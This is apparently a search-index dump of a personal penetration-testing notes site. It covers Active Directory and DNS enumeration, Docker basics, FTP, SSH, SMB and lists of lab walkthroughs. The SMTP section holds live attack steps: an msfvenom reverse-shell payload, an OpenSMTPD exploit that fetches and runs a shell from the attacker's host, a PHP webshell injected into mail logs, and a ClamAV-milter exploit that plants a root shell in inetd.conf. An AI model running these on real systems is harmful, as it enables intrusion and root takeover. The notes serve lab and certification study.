{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#welcome-back","title":"Welcome back !!!","text":"<p>Every step forward counts \u2014 dig deep and try harder.</p>"},{"location":"active-directory/","title":"Table of contents","text":""},{"location":"active-directory/enumeration/","title":"Active Directory Enumeration","text":""},{"location":"active-directory/enumeration/#users-and-groups","title":"Users and Groups","text":"<p>Users Enumeration</p> <pre><code>net user /domain\n</code></pre> <pre><code>net user hades /domain\n</code></pre> <p>Group Enumeration</p> <pre><code>net group /domain\n</code></pre> <pre><code>net localgroup administrators\n</code></pre>"},{"location":"active-directory/enumeration/#ldap-enum","title":"LDAP Enum","text":"<pre><code>LDAP://HostName[:PortNumber][/DistinguishedName]\n</code></pre> <p>Get Host Name of the Domain Controller</p> <pre><code>[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n</code></pre> Enumldap-enum.ps1 <pre><code>PS C:\\Users\\admin\\Desktop&gt; .\\ldap-enum.ps1\nLDAP://WIN-GFL2HT22DPG.leecybersec.com/DC=leecybersec,DC=local\n\nName                           Value\n----                           -----\ngivenname                      {admin}\n&lt;snip&gt;\ndistinguishedname              {CN=admin,CN=Users,DC=leecybersec,DC=local}\nuserprincipalname              {admin@leecybersec.local}\n</code></pre> <pre><code># Generate LDAP path, file `ldap-enum.ps1`\n\n# .\\ldap-enum.ps1\n# LDAP://WIN-GFL2HT22DPG.leecybersec.com/DC=leecybersec,DC=local\n\n$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n$PDC = ($domainObj.PdcRoleOwner).Name\n$SearchString = \"LDAP://\"\n$SearchString += $PDC + \"/\"\n$DistinguishedName = \"DC=$($domainObj.Name.Replace('.', ',DC='))\"\n$SearchString += $DistinguishedName\n$SearchString\n\n# Execute LDAP search for each user\n\n$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)\n$objDomain = New-Object System.DirectoryServices.DirectoryEntry\n$Searcher.SearchRoot = $objDomain\n\n# supply 0x30000000 (decimal 805306368) to enumerate all users in the domain\n# $Searcher.filter=\"samAccountType=805306368\"\n\n$Searcher.filter=\"name=admin\"\n\n$Result = $Searcher.FindAll()\n\nForeach($obj in $Result)\n{\n    Foreach($prop in $obj.Properties)\n    {\n        $prop\n    }\n\n    Write-Host \"------------------------\"\n}\n</code></pre>"},{"location":"active-directory/enumeration/#resolving-nested-groups","title":"Resolving Nested Groups","text":""},{"location":"blog/","title":"Blog","text":""},{"location":"blog/2024/01/31/hackthebox-walkthrough/","title":"hackthebox walkthrough","text":"<ul> <li> <code>001-lame_vsftpd-2.3.4-samba-3.0.20-distcc-daemon_suid-nmap</code></li> <li> <code>002-legacy_smb_ms08-067-ms17-010</code></li> <li> <code>003-devel_aspx-backdoor_ms11-046-6.1.7600</code></li> <li> <code>004-popcorn_torrent-hoster_pam-1.1.0-kernel-2.6.37</code></li> <li> <code>005-beep_elastix-2.2.0-webmin-shellshock_suid-nmap</code></li> <li> <code>006-optimum_httpfileserver-2.3_ms16-098-6.3.9600</code></li> <li> <code>007-bastard_drupa7.54_MS15-051-6.3.9600</code></li> <li> <code>011-cronos_SQL-Injection_overwrite-crontab</code></li> <li> <code>021-haircut-command_inj-screen_4.5.0</code></li> <li> <code>051-blue_EternalBlue-MS17-010</code></li> <li> <code>054-nineveh_LFIbypassFiltering_Chkrootkit-Knockd</code></li> <li> <code>108-shocker_Shellshock_sudo-perl</code></li> <li> <code>118-bashed_phpbash-discovery_sudo-scriptmanager</code></li> <li> <code>121-nibbles_Nibbleblog-4.0.3_sudo-monitor</code></li> <li> <code>134-canape_cPickle-Deserialize_Erlang-couchdb_sudo-pip</code></li> <li> <code>142-bounty_web.config-asp-backdoor_JuicyPotato</code></li> <li> <code>144-jerry_tomcat-deploy-war</code></li> <li> <code>186-bastion_mount-vhd-SAM_mRemoteNG-creds</code></li> <li> <code>240-servmon_NVMS-1000_NSClient-0.5.2.35</code></li> <li> <code>259-tabby_tomcat-script-deploy_lxd-lxc-mount</code></li> </ul>"},{"location":"blog/2024/01/31/pg-walkthrough---private/","title":"pg walkthrough - private","text":"Warm-up <p> <code>1. Internal</code> <code>2. Helpdesk</code> <code>3. Bratarina</code> <code>4. Kevin</code> <code>5. Pebbles</code> <code>6. Twiggy</code> <code>7. Metallus</code> <code>8. Hawat</code> <code>9. Interface</code> <code>10. Wombo</code> <code>11. Algernon</code> <code>12. ClamAV</code> </p> Get-to-work <p> <code>1. Butch</code> <code>2. Reconstruction</code> <code>3. Shenzi</code> <code>4. ZenPhoto</code> <code>5. Nappa</code> <code>6. Sorcerer</code> <code>7. Snookums</code> <code>8. Fail</code> <code>9. AuthBy</code> <code>10. Catto</code> <code>11. Hutch</code> <code>12. Zino</code> <code>13. Walla</code> <code>14. Banzai</code> <code>15. Roquefort</code> <code>16. Malbec</code> <code>17. Postfish</code> <code>18. Sybaris</code> <code>19. Hunit</code> <code>20. G00g</code> <code>21. UC404</code> <code>22. Splodge</code> <code>23. PayDay</code> <code>24. UT99</code> <code>25. Medjed</code> <code>26. Hetemit</code> <code>27. Nibbles</code> <code>28. Dibble</code> <code>29. Jacko</code> <code>30. Cassios</code> <code>31. Nukem</code> <code>32. Flasky</code> <code>33. Apex</code> <code>34. XposedAPI</code> <code>35. Billyboss</code> <code>36. Hepet</code> <code>37. Quackerjack</code> <code>38. WebCal</code> <code>39. Pelican</code> <code>40. Panic</code> </p> Try-harder <p> <code>1. CookieCutter</code> <code>2. Clyde</code> <code>3. Peppo</code> <code>4. BadCorp</code> <code>5. Shifty</code> <code>6. Vector</code> <code>7. Synapse</code> <code>8. Escape</code> <code>9. Megavolt</code> <code>10. Develop</code> <code>11. Phobos</code> <code>12. Meathead</code> <code>13. Sirol</code> <code>14. Tico</code> </p>"},{"location":"blog/2024/01/31/tryhackme-walkthrough/","title":"tryhackme walkthrough","text":"<p>under construction</p>"},{"location":"blog/2024/01/31/vulnhub-walkthrough/","title":"vulnhub walkthrough","text":"<p>under construction</p>"},{"location":"blue-teaming/","title":"Blue Teams Academy - Free Training 2022","text":""},{"location":"cloud-pentest/","title":"Table of contents","text":""},{"location":"devsecops/","title":"Index","text":"<p>Secure-docker</p> <p>Docker Basics</p> <p>Docker Hacking</p>"},{"location":"devsecops/cac/","title":"Compliance as Code","text":""},{"location":"devsecops/ci-cd/","title":"Continuous integration and continuous delivery","text":""},{"location":"devsecops/dast/","title":"Dynamic Application Security Testing","text":""},{"location":"devsecops/docker/docker-basics/","title":"Docker Basics","text":""},{"location":"devsecops/docker/docker-basics/#docker-commands","title":"Docker commands","text":"<p>https://docs.docker.com/engine/reference/commandline</p>"},{"location":"devsecops/docker/docker-basics/#images","title":"Images","text":"<pre><code>docker search nmap\n</code></pre> <p>Pull image</p> <pre><code>docker pull uzyexe/nmap\n</code></pre> <p>Run image:</p> <pre><code>docker run -it uzyexe/nmap --help\n</code></pre> <pre><code>docker run -i -d --name myubuntu ubuntu\n</code></pre> <ul> <li><code>-d</code> for running in the backgound</li> <li><code>\u2013interactive</code> or <code>-i</code> argument keep the container running</li> </ul> <p>Check history in images</p> <pre><code>docker image history image-name\n</code></pre>"},{"location":"devsecops/docker/docker-basics/#containers","title":"Containers","text":"<p>Run a command in a running container</p> <pre><code>docker exec myubuntu whoami\n</code></pre> <p>spawn a shell in the container</p> <pre><code>docker exec -it myubuntu bash\n</code></pre> <p>List containers</p> <pre><code>docker ps -a\n</code></pre> <p>Show the running processes of a container</p> <pre><code>docker top myubuntu\n</code></pre> <p>Check logs in the container</p> <pre><code>docker logs CONTAINER_ID\n</code></pre>"},{"location":"devsecops/docker/docker-basics/#manage-data-in-docker","title":"Manage Data In Docker","text":""},{"location":"devsecops/docker/docker-basics/#docker-volumes","title":"Docker volumes","text":"<p>create volume</p> <pre><code>docker volume create data\n</code></pre> <pre><code>/# ls /var/lib/docker/volumes/\ndata  metadata.db\n</code></pre> <p>run a container to use data volumes</p> <pre><code>docker run --name ubuntu -d -v data:/opt -it ubuntu:18.04\n</code></pre>"},{"location":"devsecops/docker/docker-basics/#bind-mounts","title":"Bind mounts","text":"<pre><code>docker run --name ubuntu -d -v /opt:/opt -it ubuntu:18.04\n</code></pre>"},{"location":"devsecops/docker/docker-basics/#tmpfs-mounts","title":"tmpfs mounts","text":"<p>https://docs.docker.com/storage/tmpfs/</p>"},{"location":"devsecops/docker/docker-basics/#docker-registry","title":"Docker Registry","text":""},{"location":"devsecops/docker/docker-basics/#deploy-local-registry","title":"Deploy local registry","text":"<p>https://docs.docker.com/registry/deploying/</p> <pre><code>docker run -d -p 5000:5000 --restart=always --name registry registry:2\n</code></pre>"},{"location":"devsecops/docker/docker-basics/#store-the-images","title":"Store the images","text":"<p>add the image name with the registry url as a prefix</p> <pre><code>docker tag ubuntu:1.0 localhost:5000/ubuntu:1.0\n</code></pre> <p>push the image to the docker registry</p> <pre><code>docker push localhost:5000/ubuntu:1.0\n</code></pre> <p>check images on the registy</p> <pre><code>curl localhost:5000/v2/_catalog\n</code></pre>"},{"location":"devsecops/docker/docker-basics/#docker-networking","title":"Docker Networking","text":""},{"location":"devsecops/docker/docker-basics/#basic-commands","title":"Basic commands","text":"<p>See available networks</p> <pre><code>docker network ls\n</code></pre> <pre><code>docker network list\n</code></pre> <p>remove</p> <pre><code>docker network rm mynetwork\n</code></pre> Network Descriptions bridge This is the default network driver when you don\u2019t specify a driver to the containers. Containers on the same bridged network can speak to each other, but are isolated from containers on other bridged networks. All containers can access the external network through NAT host The containers use the host\u2019s networking directly, while retaining separation on storage and processing. Ports exposed by the container are exposed on the external network using the host\u2019s IP address macvlan When creating a macvlan, you assign a parent network device (e.g. \u201ceth0\u201d). Each container on the macvlan network will receive its own MAC address on the network that eth0 is connected to. Each container has full network access. Warning: when misconfigured, you may overrun the network with too many MACs, or you may duplicate IP addresses none networking is disabled with this network driver, containers cannot communicate to each others, nor with the external network"},{"location":"devsecops/docker/docker-basics/#bridge-config","title":"Bridge config","text":"<p>https://blog.oddbit.com/post/2018-03-12-using-docker-macvlan-networks/</p> <p>Create new and view detail</p> <pre><code>docker network create mynetwork\n</code></pre> <pre><code>docker network create --subnet 192.10.1.0/16 app\n</code></pre> <pre><code>docker inspect mynetwork\n</code></pre> <p>attach container using <code>mynetwork</code></p> <pre><code>docker run -d --name ubuntu --network mynetwork -it ubuntu:18.04\n</code></pre> <p>connect to running container</p> <pre><code>docker network connect app ubuntu\n</code></pre>"},{"location":"devsecops/docker/docker-basics/#macvlan-config","title":"macvlan config","text":"<p>create</p> <pre><code>docker network create --driver macvlan mymacvlan\n</code></pre> <p>attach container using <code>mymacvlan</code></p> <pre><code>docker run -d --name ubuntu --network mymacvlan -it ubuntu:18.04\n</code></pre> <p>detail vlan for container</p> <pre><code>docker inspect ubuntu -f \"{{json .NetworkSettings.Networks }}\" | jq\n</code></pre> <p>https://docs.docker.com/network/macvlan/</p>"},{"location":"devsecops/docker/docker-basics/#none-config","title":"none config","text":"<p>create</p> <pre><code>docker run -d --name ubuntu --network=none -it ubuntu:18.04\n</code></pre>"},{"location":"devsecops/docker/docker-basics/#create-docker-image","title":"Create Docker Image","text":""},{"location":"devsecops/docker/docker-basics/#dockerfile","title":"Dockerfile","text":"DockerfileSyntax Description <pre><code># FROM python base image\nFROM ubuntu:18.04\n\n# COPY startup script\nCOPY . /app\n\nWORKDIR /app\n\nRUN apt update &amp;&amp; apt install nginx -y\nRUN apk add --no-cache gawk sed bash grep bc coreutils\n\n# EXPOSE port 8080 for communication to/from server\nEXPOSE 8080\n\nENTRYPOINT [\"/bin/bash\", \"-c\"]\n# CMD specifcies the command to execute container starts running.\nCMD [\"/app/run_app_docker.sh\"]\n</code></pre> Syntax Description FROM: Creates a layer from Docker Image. Specifies the base image to use. COPY: Copies the files from the local directory to the docker image on a specific location. ADD: Similar to COPY but supports file download (HTTP), auto extracting compressed file(s), and replacing the existing file to a specific location if needed forcefully. RUN: Run OS command (just like you would do on a terminal) but only executes it during the image creation process. ENTRYPOINT: Run a command as the default command when the container starts. Its the entrypoint to the utility/command. CMD: Command to run when a container starts or arguments to ENTRYPOINT if specified. <p>https://goinbigdata.com/docker-run-vs-cmd-vs-entrypoint/</p> <p><code>sleep infinity</code> tells the container to keep the process alive.</p> <pre><code>FROM ubuntu:18.04\n\nRUN apt update &amp;&amp; apt install nginx -y\n\nCMD [\"/bin/bash\", \"-c\" , \"service nginx start; sleep infinity\"]\n</code></pre>"},{"location":"devsecops/docker/docker-basics/#build-image","title":"Build Image","text":"<p>https://docs.docker.com/engine/reference/builder/</p> <pre><code>docker build -f /path/to/a/Dockerfile -t shykes/myapp .\n</code></pre> <ul> <li><code>-f</code> flag with docker build to point to a Dockerfile anywhere in your file system</li> <li><code>-t</code> tag at which to save the new image</li> </ul>"},{"location":"devsecops/docker/docker-basics/#docker-compose","title":"Docker Compose","text":""},{"location":"devsecops/docker/docker-basics/#introduction","title":"Introduction","text":"<p>Dockerfile: handle 1 container</p> <p>Docker Compose: handle multiple containers using a single file called docker-compose.yml</p> <pre><code>version: \"3\"\n\nservices:\n  ubuntu:\n    image: ubuntu:18.04\n    stdin_open: true        # the same way like docker run -i\n</code></pre> <p>Run</p> <pre><code>docker-compose up -d\n</code></pre>"},{"location":"devsecops/docker/docker-basics/#compose-file","title":"Compose file","text":"docker-compose.ymlSyntax Descriptions <pre><code>version: \"3\"\n\nservices:\n  web:\n    image: nginx\n    container_name: webserver       # name of container\n    ports:\n     - \"80:80\"                      # similar to docker run -p 80:80\n    environment:\n     - NGINX_HOST=example.com       # similar to docker run -e VAR=value\n    volumes:\n     - ./:/var/www/html/app             # ./ means a bind mounts\n     - image_data:/var/www/html/images  # image_data means use docker volume\n\nvolumes:\n  image_data:                       # similar to docker volume create\n</code></pre> Syntax Descriptions version Version of compose file format to use image Specify the image to run container_name Specify a custom container name, rather than a default name ports Expose port(s), similar to docker run -p argument environment Add environment variables into the container by defining a key-value pair volumes Volumes to save our data persistently using various options type like bind or volumes"},{"location":"devsecops/docker/docker-hacking/","title":"Docker Hacking","text":""},{"location":"devsecops/iac/","title":"Infrastructure as Code","text":""},{"location":"devsecops/sast/","title":"Static Application Security Testing","text":""},{"location":"devsecops/sca-oast/","title":"Software Component Analysis / Open Source Component Application Security Testing","text":"<p>List of SCA tools for different programming languages</p> Language SCA tool Document Javascript RetireJS https://github.com/retirejs/retire.js/"},{"location":"network-pentest/","title":"Table of contents","text":"<p>Pentest-external-internal</p> <p>Reconnaissance</p> <p>Common Services</p> <p>Remote Code Execution</p> <p>File Transfer</p> <p>Password Attacks</p> <p>Port Redirection &amp; Tunneling</p> <p>Privilege Escalation</p>"},{"location":"network-pentest/common-services/00000-general/","title":"General","text":""},{"location":"network-pentest/common-services/00000-general/#reference","title":"Reference","text":"<p>Common Ports and Services</p> <p>0daysecurity Enumeration</p>"},{"location":"network-pentest/common-services/00000-general/#service-unknown-port-xxx","title":"Service unknown - Port XXX","text":"<pre><code>$ amap -d $ip $port\namap v5.4 (www.thc.org/thc-amap) started at 2020-09-09 23:30:39 - APPLICATION MAPPING mode\n\nProtocol on &lt;ip&gt;:&lt;port&gt;/tcp matches ftp\nDump of identified response from &lt;ip&gt;:&lt;port&gt;/tcp (by trigger http):\n0000:  3232 3020 4d69 6372 6f73 6f66 7420 4654    [ 220 Microsoft FT ]\n0010:  5020 5365 7276 6963 650d 0a35 3030 2043    [ P Service..500 C ]\n0020:  6f6d 6d61 6e64 206e 6f74 2075 6e64 6572    [ ommand not under ]\n0030:  7374 6f6f 642e 0d0a 3530 3020 436f 6d6d    [ stood...500 Comm ]\n0040:  616e 6420 6e6f 7420 756e 6465 7273 746f    [ and not understo ]\n0050:  6f64 2e0d 0a                               [ od...            ]\n</code></pre>"},{"location":"network-pentest/common-services/00021-ftp/","title":"ftp 21","text":""},{"location":"network-pentest/common-services/00021-ftp/#common-cedentials","title":"Common cedentials","text":"<p><code>anonymous</code></p> <p><code>admin:admin</code></p>"},{"location":"network-pentest/common-services/00021-ftp/#check-for-anonymous-access","title":"Check for anonymous access","text":"<pre><code>$ ftp $ip $port\nConnected to &lt;ip&gt;.\n220 Microsoft FTP Service\nName (&lt;ip&gt;:&lt;host&gt;): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\nftp&gt;\n</code></pre>"},{"location":"network-pentest/common-services/00021-ftp/#ftp-common-commands","title":"FTP Common Commands","text":"<pre><code>ftp&gt; passive\nPassive mode on.\nftp&gt; binary\n200 Type set to I.\nftp&gt; ascii\n200 Type set to A.\nftp&gt; upload &lt;file&gt;\nftp&gt; get &lt;file&gt;\nftp&gt; quit\n221 Goodbye.\n</code></pre>"},{"location":"network-pentest/common-services/00022-ssh/","title":"ssh 22","text":""},{"location":"network-pentest/common-services/00022-ssh/#target-hosts-fingerprint","title":"Target host\u2019s fingerprint","text":"<p>Adding (whitelisting) the target host\u2019s fingerprint</p> <pre><code>ssh-keyscan -t rsa $ip &gt;&gt; ~/.ssh/known_hosts\n</code></pre>"},{"location":"network-pentest/common-services/00022-ssh/#run-commands-remotely","title":"Run commands remotely","text":"<pre><code>ssh root@$ip \"id\"\n</code></pre>"},{"location":"network-pentest/common-services/00022-ssh/#set-up-ssh","title":"Set up ssh","text":"<p>Public-private key pairs are located in the <code>~/.ssh/</code> directory</p> <pre><code>ssh-keygen -t rsa\n</code></pre> <p>ssh configuration file <code>etc/ssh/sshd_conf</code></p> <p><code>ssh-copy-id</code> command will read the public key from <code>~/.ssh/id_rsa.pub</code> and adds it to <code>~/.ssh/authorized_keys</code> on the targetserver</p> <pre><code>ssh-copy-id -i ~/.ssh/id_rsa.pub user@targetserver\n</code></pre>"},{"location":"network-pentest/common-services/00022-ssh/#using-ssh","title":"Using ssh","text":"<pre><code>chmod 600 id_rsa\n</code></pre> <pre><code>ssh -i id_rsa root@$ip\n</code></pre> <pre><code>sshpass pass ssh root@$ip\n</code></pre>"},{"location":"network-pentest/common-services/00025-smtp/","title":"smtp 25","text":""},{"location":"network-pentest/common-services/00025-smtp/#what-is-smtp","title":"What is SMTP?","text":""},{"location":"network-pentest/common-services/00025-smtp/#server-connection","title":"Server Connection","text":"<pre><code>$ nc -nvC $ip 25\n$ telnet $ip 25\n\nVRFY root\nEXPN\n</code></pre>"},{"location":"network-pentest/common-services/00025-smtp/#smtp-commands","title":"SMTP Commands","text":"<pre><code>$ helo admin\n$ mail from:&lt;&gt;\n$ rcpt to:&lt;nobody&gt;\n$ data\nhades\n.\n</code></pre>"},{"location":"network-pentest/common-services/00025-smtp/#scanning-vul","title":"Scanning Vul","text":"<pre><code>$ nmap $ip -p 25 --script=smtp-*\n</code></pre> <pre><code>$ sudo msfconsole -q -x \"setg RHOSTS $ip;\nuse auxiliary/scanner/smtp/smtp_enum; run;\nuse auxiliary/scanner/smtp/smtp_relay; run;\nuse auxiliary/scanner/smtp/smtp_version; run;\nexit\"\n</code></pre>"},{"location":"network-pentest/common-services/00025-smtp/#scripting","title":"Scripting","text":"Scriptingsmtp-vrfy.py <pre><code>python3 smtp-vrfy.py &lt;username&gt;\n</code></pre> <pre><code>#!/usr/bin/python3\n\nimport socket\nimport sys\n\nif len(sys.argv) != 2:\n    print(\"Usage: python3 sys.argv[0] &lt;username&gt;\")\n    sys.exit(0)\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\nconnect = s.connect(('192.168.11.131',25))\n\nbanner = s.recv(1024)\n\nprint (banner)\n\ns.send('VRFY ' + sys.argv[1] + '\\r\\n')\nresult = s.recv(1024)\n\nprint(result)\n\ns.close()\n</code></pre>"},{"location":"network-pentest/common-services/00025-smtp/#opensmtpd-661-rce","title":"OpenSMTPD &lt; 6.6.1 - rce","text":"<p>https://www.exploit-db.com/exploits/47984</p> <pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=ip LPORT=25 -f elf &gt; shell.elf\n</code></pre> <pre><code>sudo python3 -m http.server 80\n</code></pre> <pre><code>python3 47984.py ip 25 'curl ip/shell.elf -o /tmp/shell'\npython3 47984.py ip 25 'chmod +x /tmp/shell'\npython3 47984.py ip 25 '/tmp/shell'\n</code></pre> <pre><code>sudo nc -nvlp 25                     \nlistening on [any] 25 ...\nconnect to [ip] from (UNKNOWN) [ip] 57356\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"network-pentest/common-services/00025-smtp/#lfi-to-rce","title":"LFI to rce","text":"<p>WINTERMUTE: 1 - Walkthrough</p> <p>==&gt; Postfix mail log: <code>/var/log/mail.log</code></p> <pre><code>$ nc -nC ip 25\n220 straylight ESMTP Postfix (Debian/GNU)\nmail from: \"hades &lt;?php system($_GET['cmd']); ?&gt; hades\"\n250 2.1.0 Ok\nrcpt to: \"root@localhost\"\n250 2.1.5 Ok\ndata\n354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\n.\n250 2.0.0 Ok: queued as D4E985515\nquit\n221 2.0.0 Bye\n</code></pre>"},{"location":"network-pentest/common-services/00025-smtp/#postfix-smtp-42x-4248-shellshock","title":"Postfix SMTP 4.2.x &lt; 4.2.48 - 'Shellshock'","text":"<p>https://www.exploit-db.com/exploits/34896</p>"},{"location":"network-pentest/common-services/00025-smtp/#clamav-milter-0922","title":"ClamAV Milter 0.92.2","text":"<p>https://www.exploit-db.com/exploits/4761</p> <pre><code>perl 4761.pl ip\nSendmail w/ clamav-milter Remote Root Exploit\nCopyright (C) 2007 Eliteboy\nAttacking ip...\n220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Mon, 26 Jul 2021 09:42:48 -0400; (No UCE/UBE) logging access from: [ip](FAIL)-ip]\n250-localhost.localdomain Hello [ip], pleased to meet you\n250-ENHANCEDSTATUSCODES\n250-PIPELINING\n250-EXPN\n250-VERB\n250-8BITMIME\n250-SIZE\n250-DSN\n250-ETRN\n250-DELIVERBY\n250 HELP\n250 2.1.0 &lt;&gt;... Sender ok\n250 2.1.5 &lt;nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' &gt;&gt; /etc/inetd.conf\"&gt;... Recipient ok\n250 2.1.5 &lt;nobody+\"|/etc/init.d/inetd restart\"&gt;... Recipient ok\n354 Enter mail, end with \".\" on a line by itself\n250 2.0.0 16QDgmnb004808 Message accepted for delivery\n221 2.0.0 localhost.localdomain closing connection\n</code></pre> <pre><code>$ nc -nv ip 31337 \n(UNKNOWN) [ip] 31337 (?) open\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"network-pentest/common-services/00053-dns/","title":"DNS 53","text":""},{"location":"network-pentest/common-services/00053-dns/#reference","title":"Reference","text":""},{"location":"network-pentest/common-services/00053-dns/#ip-address","title":"Ip address","text":""},{"location":"network-pentest/common-services/00053-dns/#nslookup","title":"nslookup","text":"<pre><code>nslookup\n&gt; SERVER &lt;IP_DNS&gt; #Select dns server\n&gt; 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...\n&gt; &lt;IP_MACHINE&gt; #Reverse lookup of a machine, maybe...\n</code></pre>"},{"location":"network-pentest/common-services/00053-dns/#nmap","title":"nmap","text":"<pre><code>nmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" &lt;IP&gt;\n</code></pre>"},{"location":"network-pentest/common-services/00053-dns/#dig","title":"dig","text":"<pre><code>dig axfr cronos.htb @10.10.10.13\n\ndig ANY @&lt;DNS_IP&gt; &lt;DOMAIN&gt;     #Any information\ndig A @&lt;DNS_IP&gt; &lt;DOMAIN&gt;       #Regular DNS request\ndig AAAA @&lt;DNS_IP&gt; &lt;DOMAIN&gt;    #IPv6 DNS request\ndig TXT @&lt;DNS_IP&gt; &lt;DOMAIN&gt;     #Information\ndig MX @&lt;DNS_IP&gt; &lt;DOMAIN&gt;      #Emails related\ndig NS @&lt;DNS_IP&gt; &lt;DOMAIN&gt;      #DNS that resolves that name\ndig -x 192.168.0.2 @&lt;DNS_IP&gt;   #Reverse lookup\ndig -x 2a00:1450:400c:c06::93 @&lt;DNS_IP&gt; #reverse IPv6 lookup\n\n#Use [-p PORT]  or  -6 (to use ivp6 address of dns)\n</code></pre>"},{"location":"network-pentest/common-services/00053-dns/#enum-domain","title":"Enum Domain","text":""},{"location":"network-pentest/common-services/00053-dns/#host","title":"host","text":"Options Decription NS Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain. A Also known as a host record, the \"a record\" contains the IP address of a hostname (such as mail.leecybersec.com). MX Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records. PTR PointerRecords are used in reverse lookup zones and are used to find the records associated with an IP address. CNAME Canonical Name Records are used to create aliases for other host records. TXT Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification. <p>Using options</p> <pre><code>host -t txt mail.leecybersec.com\n</code></pre>"},{"location":"network-pentest/common-services/00053-dns/#whois","title":"whois","text":"<pre><code>whois leecybersec.com\n</code></pre>"},{"location":"network-pentest/common-services/00053-dns/#nslookup_1","title":"nslookup","text":"<pre><code>nslookup leecybersec.com\n</code></pre>"},{"location":"network-pentest/common-services/00053-dns/#dnsrecon","title":"DNSRecon","text":"<pre><code>dnsrecon -d leecybersec.com -t axfr\n\ndnsrecon -d leecybersec.com -D ~/list-subdomain.txt -t brt\n</code></pre>"},{"location":"network-pentest/common-services/00053-dns/#dnsenum","title":"DNSenum","text":"<pre><code>dnsenum leecybersec.com\n</code></pre>"},{"location":"network-pentest/common-services/00053-dns/#dns-zone-transfer","title":"DNS Zone Transfer","text":"<pre><code>nmap --script=dns-zone-transfer -p 53 leecybersec.com\n</code></pre>"},{"location":"network-pentest/common-services/00053-dns/#using-zone-transfer","title":"Using zone transfer","text":"<pre><code>host -l leecybersec.com ns2.leecybersec.com\n</code></pre> <pre><code>#!/bin/bash\n\nif [ -z \"$1\" ]; then\n    echo \"[*] Simple Zone transfer script\"\n    echo \"[*] Usage   : $0 &lt;domain name&gt; \"exit 0\nfi\n\nfor server in $(host -t ns $1 | cut -d \" \" -f4); do\n    host -l $1 $server | grep \"has address\"\ndone\n</code></pre>"},{"location":"network-pentest/common-services/00110-pop3/","title":"pop3 110","text":""},{"location":"network-pentest/common-services/00110-pop3/#server-connection","title":"Server Connection","text":"<pre><code>\u250c\u2500\u2500(Hades\u327f192.168.11.140)-[3.1:21.8]~\n\u2514\u2500$ nc -nC $ip 110\n+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready \nuser john\n+OK\npass 123456\n+OK Welcome john\nlist\n+OK 1 743\n1 743\n.\nretr 1\n+OK Message follows\nReturn-Path: &lt;mailadmin@localhost&gt;\n&lt;Message&gt;\n.\nquit\n+OK Apache James POP3 Server signing off.\n</code></pre>"},{"location":"network-pentest/common-services/00110-pop3/#thunderbird-mail","title":"Thunderbird Mail","text":"<pre><code>sudo apt install thunderbird\n</code></pre>"},{"location":"network-pentest/common-services/00111-nfs/","title":"nfs 111","text":""},{"location":"network-pentest/common-services/00111-nfs/#find-services","title":"Find services","text":"<pre><code>nmap -sV -p 111 --script=rpcinfo $ip\n</code></pre>"},{"location":"network-pentest/common-services/00111-nfs/#nfs-nse-scripts","title":"NFS NSE Scripts","text":"<pre><code>nmap -p 111 --script nfs* $ip\n</code></pre>"},{"location":"network-pentest/common-services/00111-nfs/#mount","title":"Mount","text":"<pre><code>sudo mount -o nolock 192.168.11.131:/share ~/share\n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/","title":"smb 139,445","text":""},{"location":"network-pentest/common-services/00139-445-smb/#smb-enumeration","title":"SMB Enumeration","text":""},{"location":"network-pentest/common-services/00139-445-smb/#guess-servers-version","title":"Guess Server's Version","text":"<pre><code>nmap -p 139,445 $ip --script=smb-os-discovery\n</code></pre> <p>Detect Server's version using nmap features.</p> <pre><code>nmap -A 10.10.10.4\n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/#scanning","title":"Scanning","text":"<p>smbclient</p> <pre><code>smbclient -NL //ip\n</code></pre> <pre><code>smbclient -L ip --port=445 --user=Administrator\n</code></pre> <p>smbmap</p> <pre><code>smbmap -H $ip\n</code></pre> <pre><code>smbmap -u &lt;user&gt; -H $ip\n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/#scanning-vul","title":"Scanning Vul","text":"<pre><code>nmap -p 139,445 --script smb-vul* $ip\n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/#other-tools","title":"Other Tools","text":"<p>NetBIOS information</p> <pre><code>nbtscan -r $ip\n</code></pre> <p>enum4linux</p> <pre><code>enum4linux -a $ip\n</code></pre> <p>rpcclient</p> <pre><code>rpcclient -U \"\" $ip\n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/#connect-to-smb","title":"Connect to SMB","text":""},{"location":"network-pentest/common-services/00139-445-smb/#smbclient","title":"smbclient","text":"<pre><code>smbclient //ip/folder\n</code></pre> <pre><code>smbclient \\\\\\\\ip\\\\folder -U john \n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/#smbmap","title":"smbmap","text":"<pre><code>smbmap -H 192.168.11.135 -u windows_10_1903_x64 -p passwd -r 'Users\\windows_10_1903_x64\\Desktop'\n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/#mount-access","title":"Mount Access","text":"<pre><code>sudo mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 \"//ip/My Share\" /mnt/cifs\n</code></pre> <pre><code>sudo mount -t cifs -o username=Administrator,password=123456 /mnt/win10_share -o port=445 //ip/Data\n</code></pre> <pre><code>sudo mount -o nolock $ip:/home 